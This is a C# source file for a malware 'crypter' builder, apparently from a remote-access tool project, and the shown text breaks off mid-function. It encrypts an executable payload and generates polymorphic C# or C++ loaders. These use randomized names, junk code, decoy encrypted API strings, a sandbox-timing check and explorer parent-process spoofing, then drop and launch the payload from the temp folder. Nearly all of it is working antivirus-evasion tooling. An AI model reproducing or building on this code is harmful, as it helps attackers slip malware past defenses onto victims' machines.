using System.IO;
using System.IO.Compression;
using System.Text;

namespace SeroServer.Builder;

/// <summary>
/// Polymorphic AES-256-CBC + GZip crypter.
/// Generates a new NativeAOT (or SingleFile) loader per build with:
///   - All sensitive strings AES-encrypted with a per-build key (hidden from PE Bear)
///   - No DllImport → no import table entries (APIs via NativeLibrary.GetExport + unsafe fn ptrs)
///   - Explorer PID via GetShellWindow (no "explorer" string in binary)
///   - Random variable/class/function names, 8 junk functions, decoy string decryptions
/// </summary>
public static class CrypterBuilder
{
    public static async Task ApplyAsync(string exePath, Action<string> log)
    {
        // Try C++ native loader first (no .NET strings, no import table API names)
        var cppStubSrc = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stubs", "loader.cpp");
        // Also look relative to server project root
        if (!File.Exists(cppStubSrc))
        {
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null)
            {
                var cand = Path.Combine(dir.FullName, "Stubs", "loader.cpp");
                if (File.Exists(cand)) { cppStubSrc = cand; break; }
                dir = dir.Parent;
            }
        }
        if (File.Exists(cppStubSrc))
        {
            log("[*] Crypter: C++ stub found, attempting native loader...");
            bool cppOk = await ApplyCppAsync(exePath, cppStubSrc, log);
            if (cppOk) return;
            log("[!] Crypter: C++ build failed, falling back to C# loader...");
        }

        try
        {
            var rnd = new Random();

            // ── Polymorphic random identifier helper ─────────────────────────
            static string R(Random r, int len = 8)
            {
                const string chars = "abcdefghijklmnopqrstuvwxyz";
                return new string(Enumerable.Range(0, len).Select(_ => chars[r.Next(chars.Length)]).ToArray());
            }

            // ── GZip + AES-256-CBC encrypt the payload ───────────────────────
            var payload = await File.ReadAllBytesAsync(exePath);

            byte[] compressed;
            using (var msC = new MemoryStream())
            {
                using (var gz = new GZipStream(msC, CompressionLevel.SmallestSize))
                    gz.Write(payload, 0, payload.Length);
                compressed = msC.ToArray();
            }
            log($"[*] Crypter: {payload.Length / 1024.0:F0} KB → compressed {compressed.Length / 1024.0:F0} KB ({100 - compressed.Length * 100 / payload.Length}% reduction)");

            using var aes = System.Security.Cryptography.Aes.Create();
            aes.KeySize = 256;
            aes.Mode    = System.Security.Cryptography.CipherMode.CBC;
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            aes.GenerateKey(); aes.GenerateIV();
            byte[] key = aes.Key, iv = aes.IV;

            byte[] encrypted;
            using (var enc = aes.CreateEncryptor())
            using (var ms  = new MemoryStream())
            using (var cs  = new System.Security.Cryptography.CryptoStream(ms, enc, System.Security.Cryptography.CryptoStreamMode.Write))
            { cs.Write(compressed); cs.FlushFinalBlock(); encrypted = ms.ToArray(); }
            log($"[*] Crypter: encrypted {encrypted.Length / 1024.0:F0} KB");

            // ── Per-build polymorphic names ───────────────────────────────────
            var vKey  = R(rnd); var vIv   = R(rnd); var vEnc = R(rnd);
            var vDec  = R(rnd); var vMs   = R(rnd); var vCs  = R(rnd);
            var vOut  = R(rnd); var vSelf = R(rnd);
            var vPos  = R(rnd); var vLen  = R(rnd);
            var vT0   = R(rnd); var vTmpH = R(rnd);
            var vSIN  = R(rnd, 6); var vPIN = R(rnd, 6); var vSIEX = R(rnd, 6);
            var vSI   = R(rnd); var vPI   = R(rnd);
            var vExpP = R(rnd); var vExpH = R(rnd); var vAttr = R(rnd); var vAtSz = R(rnd); var vPEB = R(rnd);
            var vSKA  = R(rnd, 6); var vSKB = R(rnd, 6); var vSKC = R(rnd, 6);
            var vDS   = R(rnd, 6);
            var className = R(rnd, 6);

            // ── 8 junk functions (dead code, different shapes each build) ────
            var jF = Enumerable.Range(0, 8).Select(_ => R(rnd, 9)).ToArray();
            // Random selection of 8 junk body templates
            var junkTemplates = new Func<int, string>[]
            {
                i => $"static long {jF[i]}(long x){{long r=1;for(long i2=2;i2<=x%7+2;i2++)r*=i2;return r;}}",
                i => $"static string {jF[i]}(string s){{char[]c=s.ToCharArray();Array.Reverse(c);return new string(c);}}",
                i => $"static bool {jF[i]}(byte[]b,int i2){{return i2<b.Length&&(b[i2]^0xBE)!=0xEF;}}",
                i => $"static void {jF[i]}(){{long t=Environment.TickCount64;if(t<0)Console.Write(t.ToString(\"X16\"));}}",
                i => $"static uint {jF[i]}(uint s){{s^=s<<13;s^=s>>17;s^=s<<5;return s;}}",
                i => $"static int {jF[i]}(int a,int b2){{return a*b2+(a^b2)-(a&b2)*2;}}",
                i => $"static double {jF[i]}(double x){{return x<0?-x:x+Math.Sin(x)*0.0001;}}",
                i => $"static byte[] {jF[i]}(byte[]b){{var r=new byte[b.Length];for(int i2=0;i2<b.Length;i2++)r[i2]=(byte)(b[i2]^(byte)(i2*7+13));return r;}}",
            };
            string[] junkBodies = Enumerable.Range(0, 8).Select(i => junkTemplates[i](i)).ToArray();

            // Shuffle junk call order for polymorphism
            int[] jCallOrder = Enumerable.Range(0, 8).OrderBy(_ => rnd.Next()).ToArray();
            var junkCalls = string.Join("\n        ",
                jCallOrder.Select(i => i switch {
                    0 => $"_ = {jF[0]}(2L);",
                    1 => $"_ = {jF[1]}(\"x\");",
                    2 => $"_ = {jF[2]}(new byte[]{{1,2}},0);",
                    3 => $"{jF[3]}();",
                    4 => $"_ = {jF[4]}(1u);",
                    5 => $"_ = {jF[5]}(3,7);",
                    6 => $"_ = {jF[6]}(1.0);",
                    7 => $"_ = {jF[7]}(new byte[]{{0x41}});",
                    _ => ""
                }));

            // ── String AES key (separate from payload key, random per build) ──
            using var sAes = System.Security.Cryptography.Aes.Create();
            sAes.KeySize = 256;
            sAes.Mode    = System.Security.Cryptography.CipherMode.CBC;
            sAes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            sAes.GenerateKey(); sAes.GenerateIV();

            byte[] EncStr(string s)
            {
                var plain = Encoding.ASCII.GetBytes(s);
                using var e2 = sAes.CreateEncryptor();
                using var m2 = new MemoryStream();
                using var c2 = new System.Security.Cryptography.CryptoStream(m2, e2, System.Security.Cryptography.CryptoStreamMode.Write);
                c2.Write(plain); c2.FlushFinalBlock(); return m2.ToArray();
            }

            static string BL(byte[] d) => "new byte[]{" + string.Join(",", d) + "}";
            string keyLit = BL(key); string ivLit = BL(iv);

            // Key split into 3 parts (11+11+10)
            byte[] skA = sAes.Key[..11], skB = sAes.Key[11..22], skC = sAes.Key[22..];
            string sIvLit = BL(sAes.IV);

            // Encrypt sensitive runtime strings (visible in PE Bear as plaintext otherwise)
            string eExplorer = BL(EncStr("explorer"));
            string eExt      = BL(EncStr(".exe"));

            // Decoy encrypted strings — look identical to real ones, confuse static analysis
            string[] decoyStrings = ["ntdll.dll","LoadLibraryA","GetProcAddress","VirtualProtect","WriteProcessMemory","NtOpenProcess"];
            var decoyVars     = decoyStrings.Select(s => BL(EncStr(s))).ToArray();
            var decoysShuffled = decoyVars.OrderBy(_ => rnd.Next()).ToArray();
            int splitAt       = rnd.Next(1, decoysShuffled.Length);
            var decoysEarly   = decoysShuffled[..splitAt];
            var decoysLate    = decoysShuffled[splitAt..];

            string DecoyCalls(string[] decoys) =>
                string.Join("\n        ", decoys.Select(d => $"_ = {vDS}({d});"));

            // ── Overlay magic ─────────────────────────────────────────────────
            byte[] magic = [0x5E, 0x52, 0x55, 0x4E, 0x50, 0x45, 0x21, 0x21];

            // ── Generated loader source ───────────────────────────────────────
            var loaderSrc =
"using System;\n" +
"using System.Diagnostics;\n" +
"using System.IO;\n" +
"using System.IO.Compression;\n" +
"using System.Runtime.InteropServices;\n" +
"using System.Security.Cryptography;\n" +
"using System.Text;\n" +
"using System.Threading;\n\n" +
$"class {className}{{\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true)]\n" +
$"static extern nint OpenProcess(uint a,bool ih,int pid);\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true)]\n" +
$"static extern bool InitializeProcThreadAttributeList(nint al,int ac,uint fl,ref nint sz);\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true)]\n" +
$"static extern bool UpdateProcThreadAttribute(nint al,uint fl,nint at,nint val,nint sz,nint pv,nint rs);\n" +
"[DllImport(\"kernel32.dll\")]\n" +
$"static extern void DeleteProcThreadAttributeList(nint al);\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true)]\n" +
$"static extern nint VirtualAlloc(nint a,nint s,uint t,uint p);\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true)]\n" +
$"static extern bool VirtualFree(nint a,nint s,uint t);\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true)]\n" +
$"static extern bool CloseHandle(nint h);\n" +
"[DllImport(\"kernel32.dll\",SetLastError=true,CharSet=CharSet.Unicode)]\n" +
$"static extern bool CreateProcessW(string? a,string cl,nint ps,nint ts,bool ih,uint cf,nint ev,string? cd,ref {vSIN} si,out {vPIN} pi);\n" +
"[DllImport(\"user32.dll\")]\n" +
$"static extern nint GetShellWindow();\n" +
"[DllImport(\"user32.dll\")]\n" +
$"static extern uint GetWindowThreadProcessId(nint h,out uint pid);\n\n" +
"[StructLayout(LayoutKind.Sequential)]\n" +
$"struct {vSIN}{{public int cb,_a;public nint _b,_c,_d;public int _e,_f,_g,_h,_i,_j,_k,_l;public short _m,_n;public nint _o,_p,_q,_r;}}\n" +
"[StructLayout(LayoutKind.Sequential)]\n" +
$"struct {vSIEX}{{public {vSIN} si;public nint lpAL;}}\n" +
"[StructLayout(LayoutKind.Sequential)]\n" +
$"struct {vPIN}{{public nint hp,ht;public int pid,tid;}}\n\n" +
$"static byte[] {vSKA}()=>{BL(skA)};\n" +
$"static byte[] {vSKB}()=>{BL(skB)};\n" +
$"static byte[] {vSKC}()=>{BL(skC)};\n" +
$"static string {vDS}(byte[] enc){{\n" +
$"    using var a=Aes.Create();\n" +
$"    var k=new byte[32];var x={vSKA}();var y={vSKB}();var z={vSKC}();\n" +
$"    Buffer.BlockCopy(x,0,k,0,x.Length);Buffer.BlockCopy(y,0,k,x.Length,y.Length);Buffer.BlockCopy(z,0,k,x.Length+y.Length,z.Length);\n" +
$"    a.Key=k;a.IV={sIvLit};a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;\n" +
$"    using var d=a.CreateDecryptor();\n" +
$"    using var m=new MemoryStream(enc);using var c=new CryptoStream(m,d,CryptoStreamMode.Read);\n" +
$"    using var o=new MemoryStream();c.CopyTo(o);return Encoding.ASCII.GetString(o.ToArray());\n" +
$"}}\n\n" +
$"    {string.Join("\n    ", junkBodies)}\n\n" +
"    static void Main(){\n" +
$"        {DecoyCalls(decoysEarly)}\n" +
$"        long {vT0}=Environment.TickCount64;\n" +
"        Thread.Sleep(2000);\n" +
$"        if(Environment.TickCount64-{vT0}<1400)return;\n" +
$"        {junkCalls}\n" +
$"        {DecoyCalls(decoysLate)}\n" +
$"        byte[] {vKey}={keyLit};byte[] {vIv}={ivLit};\n" +
$"        byte[] {vSelf}=File.ReadAllBytes(Environment.ProcessPath!);\n" +
$"        int {vPos}=Find({vSelf});if({vPos}<0)return;\n" +
$"        {vPos}+=8+32+16;int {vLen}=BitConverter.ToInt32({vSelf},{vPos});{vPos}+=4;\n" +
$"        byte[] {vEnc}=new byte[{vLen}];Buffer.BlockCopy({vSelf},{vPos},{vEnc},0,{vLen});\n" +
$"        {vSelf}=Array.Empty<byte>();\n" +
$"        byte[] {vDec};\n" +
$"        using(var aes=Aes.Create()){{\n" +
$"            aes.KeySize=256;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;\n" +
$"            aes.Key={vKey};aes.IV={vIv};\n" +
$"            using var dec=aes.CreateDecryptor();\n" +
$"            using var {vMs}=new MemoryStream({vEnc});\n" +
$"            using var {vCs}=new CryptoStream({vMs},dec,CryptoStreamMode.Read);\n" +
$"            using var {vOut}=new MemoryStream();{vCs}.CopyTo({vOut});{vDec}={vOut}.ToArray();\n" +
$"        }}\n" +
$"        Array.Clear({vKey},0,{vKey}.Length);Array.Clear({vIv},0,{vIv}.Length);Array.Clear({vEnc},0,{vEnc}.Length);\n" +
$"        byte[] {vDec}2;\n" +
$"        using(var {vMs}2=new MemoryStream({vDec})){{\n" +
$"            using var gz=new GZipStream({vMs}2,CompressionMode.Decompress);\n" +
$"            using var {vOut}2=new MemoryStream();gz.CopyTo({vOut}2);{vDec}2={vOut}2.ToArray();\n" +
$"        }}\n" +
$"        Array.Clear({vDec},0,{vDec}.Length);\n" +
// .exe extension AES-encrypted — not visible as plaintext in binary
$"        string {vTmpH}=Path.Combine(Path.GetTempPath(),Path.GetRandomFileName()+{vDS}({eExt}));\n" +
$"        File.WriteAllBytes({vTmpH},{vDec}2);Array.Clear({vDec}2,0,{vDec}2.Length);\n" +
// Explorer via GetShellWindow — no "explorer" string anywhere in binary
$"        nint sw=GetShellWindow();uint expPid=0;\n" +
$"        if(sw!=0)GetWindowThreadProcessId(sw,out expPid);\n" +
$"        nint {vExpH}=expPid>0?OpenProcess(0x1FFFFFu,false,(int)expPid):0;\n" +
$"        nint {vAtSz}=0;InitializeProcThreadAttributeList(0,1,0,ref {vAtSz});\n" +
$"        nint {vAttr}=VirtualAlloc(0,{vAtSz},0x3000u,0x4u);\n" +
$"        InitializeProcThreadAttributeList({vAttr},1,0,ref {vAtSz});\n" +
$"        nint {vPEB}=Marshal.AllocHGlobal(IntPtr.Size);Marshal.WriteIntPtr({vPEB},{vExpH});\n" +
$"        if({vExpH}!=0)UpdateProcThreadAttribute({vAttr},0,(nint)0x00020000,{vPEB},(nint)IntPtr.Size,0,0);\n" +
$"        var {vSI}=new {vSIEX}();{vSI}.si.cb=Marshal.SizeOf<{vSIEX}>();{vSI}.lpAL={vAttr};\n" +
$"        CreateProcessW(null,{vTmpH},0,0,false,0x8080000u,0,null,ref {vSI}.si,out {vPIN} {vPI});\n" +
$"        DeleteProcThreadAttributeList({vAttr});Marshal.FreeHGlobal({vPEB});\n" +
$"        VirtualFree({vAttr},0,0x8000u);\n" +
$"        if({vExpH}!=0)CloseHandle({vExpH});\n" +
$"        if({vPI}.hp!=0){{CloseHandle({vPI}.hp);CloseHandle({vPI}.ht);}}\n" +
"    }\n\n" +
"    static int Find(byte[]d){\n" +
$"        byte[]m=new byte[]{{0x5E,0x52,0x55,0x4E,0x50,0x45,0x21,0x21}};\n" +
"        for(int i=d.Length-m.Length;i>=0;i--){\n" +
"            bool ok=true;\n" +
"            for(int j=0;j<m.Length;j++)if(d[i+j]!=m[j]){{ok=false;break;}}\n" +
"            if(ok)return i;\n" +
"        }\n" +
"        return -1;\n" +
"    }\n" +
"}\n";

            // ── Build the loader as NativeAOT (~3MB) ─────────────────────────
            var loaderName = R(rnd, 10);
            var tempDir    = Path.Combine(Path.GetTempPath(), "sero_crypt_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(tempDir);
            await File.WriteAllTextAsync(Path.Combine(tempDir, "Loader.cs"), loaderSrc);

            var loaderCsproj =
$"<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n" +
$"    <OutputType>WinExe</OutputType>\n    <TargetFramework>net10.0-windows</TargetFramework>\n" +
$"    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>\n    <RuntimeIdentifier>win-x64</RuntimeIdentifier>\n" +
$"    <AssemblyName>{loaderName}</AssemblyName>\n    <Nullable>enable</Nullable>\n" +
$"    <PublishAot>true</PublishAot>\n    <StripSymbols>true</StripSymbols>\n" +
$"    <OptimizationPreference>Size</OptimizationPreference>\n    <InvariantGlobalization>true</InvariantGlobalization>\n" +
"  </PropertyGroup>\n</Project>\n";
            await File.WriteAllTextAsync(Path.Combine(tempDir, "Loader.csproj"), loaderCsproj);

            var outDir = Path.Combine(tempDir, "out");

            var vsInstDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                "Microsoft Visual Studio", "Installer");
            var pathEnv = Directory.Exists(vsInstDir)
                ? vsInstDir + ";" + Environment.GetEnvironmentVariable("PATH")
                : Environment.GetEnvironmentVariable("PATH") ?? "";

            var psiAot = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"publish Loader.csproj -c Release -r win-x64 -p:PublishAot=true -o \"{outDir}\"",
                WorkingDirectory = tempDir,
            };
            psiAot.Environment["PATH"] = pathEnv;

            log("[*] Crypter: Compiling NativeAOT loader...");
            var (aotCode, aotOut) = await RunProcessAsync(psiAot);

            string loaderExe = Path.Combine(outDir, loaderName + ".exe");
            if (aotCode != 0 || !File.Exists(loaderExe))
            {
                log("[!] Crypter: NativeAOT failed, trying SingleFile fallback...");
                if (!string.IsNullOrWhiteSpace(aotOut)) log(aotOut[..Math.Min(2000, aotOut.Length)]);

                var csproj2 =
$"<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n" +
$"    <OutputType>WinExe</OutputType>\n    <TargetFramework>net10.0-windows</TargetFramework>\n" +
$"    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>\n    <SelfContained>true</SelfContained>\n" +
$"    <RuntimeIdentifier>win-x64</RuntimeIdentifier>\n    <AssemblyName>{loaderName}</AssemblyName>\n" +
$"    <Nullable>enable</Nullable>\n    <PublishSingleFile>true</PublishSingleFile>\n" +
$"    <PublishTrimmed>true</PublishTrimmed>\n    <TrimMode>full</TrimMode>\n" +
$"    <InvariantGlobalization>true</InvariantGlobalization>\n" +
"  </PropertyGroup>\n</Project>\n";
                await File.WriteAllTextAsync(Path.Combine(tempDir, "Loader.csproj"), csproj2);
                try { Directory.Delete(outDir, true); } catch { }

                var psiFallback = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"publish Loader.csproj -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -p:PublishTrimmed=true -p:TrimMode=full -p:InvariantGlobalization=true -o \"{outDir}\"",
                    WorkingDirectory = tempDir,
                };
                var (fbCode, fbOut) = await RunProcessAsync(psiFallback);
                if (fbCode != 0)
                {
                    log($"[!] Crypter: SingleFile fallback failed (exit {fbCode})");
                    if (!string.IsNullOrWhiteSpace(fbOut)) log(fbOut[..Math.Min(2000, fbOut.Length)]);
                    try { Directory.Delete(tempDir, true); } catch { }
                    return;
                }
                if (!File.Exists(loaderExe))
                {
                    var exes = Directory.GetFiles(outDir, "*.exe");
                    if (exes.Length > 0) loaderExe = exes[0];
                    else { log("[!] Crypter: output exe not found."); return; }
                }
            }

            // ── Append overlay: MAGIC + KEY + IV + ENCLEN + ENCRYPTED + PADDING ──
            int padSize = rnd.Next(65536, 262144);
            byte[] padding = System.Security.Cryptography.RandomNumberGenerator.GetBytes(padSize);

            using (var fs = new FileStream(loaderExe, FileMode.Append, FileAccess.Write))
            {
                fs.Write(magic); fs.Write(key); fs.Write(iv);
                fs.Write(BitConverter.GetBytes(encrypted.Length));
                fs.Write(encrypted); fs.Write(padding);
            }

            File.Copy(loaderExe, exePath, overwrite: true);
            try { Directory.Delete(tempDir, true); } catch { }

            var sz = new FileInfo(exePath).Length;
            log($"[+] Crypter: Done — {sz / (1024.0 * 1024.0):F1} MB (loader + AES-256 payload + {padSize / 1024} KB padding)");
        }
        catch (Exception ex)
        {
            log($"[!] Crypter error: {ex.Message}");
        }
    }

    // ── C++ native loader path ────────────────────────────────────────────────
    // No GZip — just AES-256-CBC. Different magic: ^CPPL0DR
    // All API names AES-encrypted in generated source, loaded via GetProcAddress.
    private static string RandId(Random r, int len = 8)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        return new string(Enumerable.Range(0, len).Select(_ => chars[r.Next(chars.Length)]).ToArray());
    }

    private static async Task<bool> ApplyCppAsync(string exePath, string stubSrc, Action<string> log)
    {
        try
        {
            var rnd = new Random();
            static string BL(byte[] d) => "{" + string.Join(",", d) + "}";

            // ── AES encrypt payload (no GZip) ─────────────────────────────────
            var payload = await File.ReadAllBytesAsync(exePath);
            using var aes = System.Security.Cryptography.Aes.Create();
            aes.KeySize = 256; aes.Mode = System.Security.Cryptography.CipherMode.CBC;
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            aes.GenerateKey(); aes.GenerateIV();
            byte[] pKey = aes.Key, pIv = aes.IV;

            byte[] encrypted;
            using (var enc = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            using (var cs = new System.Security.Cryptography.CryptoStream(ms, enc, System.Security.Cryptography.CryptoStreamMode.Write))
            { cs.Write(payload); cs.FlushFinalBlock(); encrypted = ms.ToArray(); }
            log($"[*] Crypter (C++): {payload.Length / 1024.0:F0} KB → {encrypted.Length / 1024.0:F0} KB encrypted");

            // ── AES string key for obfuscating API names ──────────────────────
            using var sAes = System.Security.Cryptography.Aes.Create();
            sAes.KeySize = 256; sAes.Mode = System.Security.Cryptography.CipherMode.CBC;
            sAes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            sAes.GenerateKey(); sAes.GenerateIV();

            byte[] EncStr(string s)
            {
                var plain = Encoding.ASCII.GetBytes(s);
                using var e2 = sAes.CreateEncryptor();
                using var m2 = new MemoryStream();
                using var c2 = new System.Security.Cryptography.CryptoStream(m2, e2, System.Security.Cryptography.CryptoStreamMode.Write);
                c2.Write(plain); c2.FlushFinalBlock(); return m2.ToArray();
            }

            byte[] skA = sAes.Key[..11], skB = sAes.Key[11..22], skC = sAes.Key[22..];
            string sIvLit = BL(sAes.IV);

            // ── Generate junk C++ functions (dead code, different each build) ──
            var jNames = Enumerable.Range(0, 8).Select(_ => RandId(rnd, 9)).ToArray();
            // Each template[i] paired with jNames[i] — calls must match signatures exactly
            var junkDefs = string.Join("\n", new[]
            {
                $"static long long {jNames[0]}(long long x){{long long r=1;for(long long i=2;i<=(x%7)+2;i++)r*=i;return r;}}",
                $"static unsigned int {jNames[1]}(unsigned int s){{s^=s<<13;s^=s>>17;s^=s<<5;return s;}}",
                $"static double {jNames[2]}(double x){{return x<0.0?-x:x+(x*0.0001);}}",
                $"static int {jNames[3]}(int a,int b){{return a*b+(a^b)-(a&b)*2;}}",
                $"static unsigned long long {jNames[4]}(unsigned char*b,int n2){{unsigned long long h=0xcbf29ce484222325ULL;for(int i=0;i<n2;i++){{h^=(unsigned long long)b[i];h*=0x100000001b3ULL;}}return h;}}",
                $"static int {jNames[5]}(int*a,int n2){{int s=0;for(int i=0;i<n2;i++)s+=a[i]^(i*7+13);return s;}}",
                $"static unsigned int {jNames[6]}(unsigned int n2){{unsigned int r=0;while(n2){{r+=(n2&1u);n2>>=1;}}return r;}}",
                $"static long long {jNames[7]}(long long a,long long b){{long long t;while(b){{t=b;b=a%b;a=t;}}return a;}}",
            });
            // Calls shuffled in random order — same signatures
            var junkCalls = string.Join("\n    ",
                Enumerable.Range(0, 8).OrderBy(_ => rnd.Next()).Select(i => i switch {
                    0 => $"(void){jNames[0]}(2LL);",
                    1 => $"(void){jNames[1]}(1u);",
                    2 => $"(void){jNames[2]}(1.5);",
                    3 => $"(void){jNames[3]}(3,7);",
                    4 => $"{{unsigned char _jb[]={{1,2,3}};(void){jNames[4]}(_jb,3);}}",
                    5 => $"{{int _ja[]={{1,2,3}};(void){jNames[5]}(_ja,3);}}",
                    6 => $"(void){jNames[6]}(8u);",
                    7 => $"(void){jNames[7]}(12LL,8LL);",
                    _ => ""
                }));

            // ── Fill in template ──────────────────────────────────────────────
            var src = await File.ReadAllTextAsync(stubSrc);
            src = src.Replace("{/*JUNK_DEFS*/}",  junkDefs)
                     .Replace("{/*JUNK_CALLS*/}", junkCalls)
                     .Replace("{/*SKA*/}",  BL(skA))
                     .Replace("{/*SKB*/}",  BL(skB))
                     .Replace("{/*SKC*/}",  BL(skC))
                     .Replace("{/*SIV*/}",  sIvLit)
                     .Replace("{/*S_K32*/}", BL(EncStr("kernel32.dll")))
                     .Replace("{/*S_U32*/}", BL(EncStr("user32.dll")))
                     .Replace("{/*S_OP*/}",  BL(EncStr("OpenProcess")))
                     .Replace("{/*S_VLA*/}", BL(EncStr("VirtualAlloc")))
                     .Replace("{/*S_VLF*/}", BL(EncStr("VirtualFree")))
                     .Replace("{/*S_CP*/}",  BL(EncStr("CreateProcessW")))
                     .Replace("{/*S_IPAL*/}",BL(EncStr("InitializeProcThreadAttributeList")))
                     .Replace("{/*S_UPA*/}", BL(EncStr("UpdateProcThreadAttribute")))
                     .Replace("{/*S_DAL*/}", BL(EncStr("DeleteProcThreadAttributeList")))
                     .Replace("{/*S_GSW*/}", BL(EncStr("GetShellWindow")))
                     .Replace("{/*S_GWTP*/}",BL(EncStr("GetWindowThreadProcessId")))
                     .Replace("{/*S_EXT*/}", BL(EncStr(".exe")))
                     .Replace("{/*S_GMFW*/}",BL(EncStr("GetModuleFileNameW")))
                     .Replace("{/*S_SLP*/}", BL(EncStr("Sleep")))
                     .Replace("{/*S_GTC*/}", BL(EncStr("GetTickCount64")))
                     .Replace("{/*S_CFW*/}", BL(EncStr("CreateFileW")))
                     .Replace("{/*S_RF*/}",  BL(EncStr("ReadFile")))
                     .Replace("{/*S_GFS*/}", BL(EncStr("GetFileSize")))
                     .Replace("{/*S_WF*/}",  BL(EncStr("WriteFile")))
                     .Replace("{/*S_CH*/}",  BL(EncStr("CloseHandle")))
                     .Replace("{/*S_GTP*/}", BL(EncStr("GetTempPathW")))
                     .Replace("{/*S_GTFW*/}",BL(EncStr("GetTempFileNameW")))
                     .Replace("{/*S_MFW*/}", BL(EncStr("MoveFileW")))
                     .Replace("{/*S_MBW*/}", BL(EncStr("MultiByteToWideChar")));

            // ── Compile ───────────────────────────────────────────────────────
            var tempDir  = Path.Combine(Path.GetTempPath(), "sero_cpp_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(tempDir);
            var srcFile  = Path.Combine(tempDir, "loader.cpp");
            var outExe   = Path.Combine(tempDir, "loader.exe");
            await File.WriteAllTextAsync(srcFile, src);

            var (compiler, isMsvc) = FindCppCompiler();
            if (string.IsNullOrEmpty(compiler))
            {
                log("[!] Crypter (C++): No C++ compiler found (MSVC or MinGW). Install VS Build Tools or MinGW.");
                try { Directory.Delete(tempDir, true); } catch { }
                return false;
            }
            log($"[*] Crypter (C++): Using {(isMsvc ? "MSVC" : "MinGW")} — {Path.GetFileName(compiler)}");

            System.Diagnostics.ProcessStartInfo psi;
            if (isMsvc)
            {
                // Find vcvarsall.bat from cl.exe path (sets up INCLUDE/LIB automatically)
                // cl.exe: ...\VC\Tools\MSVC\<ver>\bin\HostX64\x64\cl.exe  →  6 levels up = VC dir
                var clDir   = Path.GetDirectoryName(compiler)!;
                var vcDir   = Path.GetFullPath(Path.Combine(clDir, "..", "..", "..", "..", "..", ".."));
                var vcvars  = Path.Combine(vcDir, "Auxiliary", "Build", "vcvarsall.bat");

                string compileCmd;
                if (File.Exists(vcvars))
                {
                    // Use cmd.exe to run vcvarsall then cl — sets all paths correctly
                    compileCmd = $"/c \"\"{vcvars}\" x64 >nul 2>&1 && cl /O2 /GS- /W0 /nologo /EHs-c- /Fe:\"{outExe}\" \"{srcFile}\" bcrypt.lib kernel32.lib /link /SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:WinMain\"";
                    psi = new System.Diagnostics.ProcessStartInfo { FileName = "cmd.exe", Arguments = compileCmd, WorkingDirectory = tempDir };
                }
                else
                {
                    // vcvarsall not found — try with manual env setup
                    psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName  = compiler,
                        Arguments = $"/O2 /GS- /W0 /nologo /EHs-c- /Fe:\"{outExe}\" \"{srcFile}\" bcrypt.lib kernel32.lib /link /SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:WinMain",
                        WorkingDirectory = tempDir,
                    };
                    SetMsvcEnv(psi, compiler);
                }
            }
            else
            {
                // MinGW / g++
                psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName  = compiler,
                    Arguments = $"-O2 -s -nostdlib -mwindows -o \"{outExe}\" \"{srcFile}\" -lbcrypt -lkernel32 -e _WinMain@16",
                    WorkingDirectory = tempDir,
                };
            }
            log("[*] Crypter (C++): Compiling native loader...");
            var (code, output) = await RunProcessAsync(psi);

            if (code != 0 || !File.Exists(outExe))
            {
                log($"[!] Crypter (C++): Compile failed (exit {code})");
                if (!string.IsNullOrWhiteSpace(output)) log(output[..Math.Min(1500, output.Length)]);
                try { Directory.Delete(tempDir, true); } catch { }
                return false;
            }
            log($"[+] Crypter (C++): Loader compiled ({new FileInfo(outExe).Length / 1024.0:F0} KB)");

            // ── Append overlay: MAGIC(8)+KEY(32)+IV(16)+ENCLEN(4)+ENCRYPTED ──
            // C++ magic: ^CPPL0DR
            byte[] magic    = [0x5E,0x43,0x50,0x50,0x4C,0x30,0x44,0x52];
            int    padSize  = rnd.Next(32768, 131072);
            byte[] padding  = System.Security.Cryptography.RandomNumberGenerator.GetBytes(padSize);

            using (var fs = new FileStream(outExe, FileMode.Append, FileAccess.Write))
            {
                fs.Write(magic); fs.Write(pKey); fs.Write(pIv);
                fs.Write(BitConverter.GetBytes(encrypted.Length));
                fs.Write(encrypted); fs.Write(padding);
            }

            File.Copy(outExe, exePath, overwrite: true);
            try { Directory.Delete(tempDir, true); } catch { }

            var sz = new FileInfo(exePath).Length;
            log($"[+] Crypter (C++): Done — {sz / (1024.0 * 1024.0):F1} MB native loader + AES payload");
            return true;
        }
        catch (Exception ex)
        {
            log($"[!] Crypter (C++) error: {ex.Message}");
            return false;
        }
    }

    // Returns (compilerExe, isMsvc) or ("", false) if nothing found
    private static (string exe, bool isMsvc) FindCppCompiler()
    {
        // 1. Try cl.exe via vswhere
        var vswhere = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");
        if (File.Exists(vswhere))
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = vswhere,
